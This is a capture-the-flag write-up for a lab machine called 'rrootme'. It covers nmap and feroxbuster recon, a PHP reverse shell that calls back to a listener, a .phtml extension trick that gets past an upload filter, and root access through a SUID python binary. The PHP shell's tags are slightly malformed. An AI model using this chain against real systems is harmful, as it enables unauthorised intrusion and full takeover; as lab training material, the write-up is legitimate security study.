# rrootme

## Recon
```bash
silent-scan $TARGET
nmap -sVC -p22,80 $TARGET -oN service
```

**Output**
```

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:f1:ac:d7:05:00:0e:f2:ba:6e:da:12:88:c4:8e:91 (RSA)
|   256 06:bd:0f:f8:73:b0:6e:8f:40:2f:d8:1a:c6:49:11:89 (ECDSA)
|_  256 3c:6d:0d:40:9d:47:9f:94:3a:54:66:cc:c7:7a:03:ad (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## Enumeration 

```bash
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --status-codes 200 301 
```

**Output**
```
http://10.128.129.128/js/maquina_de_escrever.js
http://10.128.129.128/panel
http://10.128.129.128/uploads
```

### When we navigate to /panel/ there is an option to upload files 
### We upload a PHP reverse shell
```bash
cat > rev.php << 'EOF'
<php
set_time_limit(0);
$ip = '192.168.160.214';  // Replace with your IP
$port = 4444;
$sock = fsockopen($ip, $port);
$descriptorspec = array(
    0 => $sock,
    1 => $sock,
    2 => $sock
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);
>
EOF
```
### When trying to upload the reverse shell, it tells us that .php is not allowed 
```bash
mv rev.php rev.phtml
```
### By changing the extension and uploading the file again, it allows it 
```bash
# To trigger the rev shell 
nc -nlvp 4444
curl http://$TARGET/uploads/rev.phtml
```
Stabilize:
```bash
# What it does: spawn an interactive bash shell using Python.
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset
```
### Search for the user flag
```bash
find / -type f -name user.txt 2> /dev/null 
cat /var/www/user.txt
```

## Privesc

### Look for SUID binaries
```bash
find / -perm -u=s -type f 2>/dev/null
```

**Output**
```
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7
/usr/bin/at
```

### We see that python has SUID permissions. We search GTFOBins for how to escalate privileges 
https://gtfobins.org/gtfobins/python/

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
cat /root/root.txt
```
---

## Related Notes
- [nmap](../../../tools/recon/nmap.md)
- [feroxbuster](../../../tools/fuzz/feroxbuster.md)
- [php-extension-bypass-upload](../../../exploits/web-rce/php-extension-bypass-upload.md)
- [suid-python](../../../privesc/linux/suid-python.md)
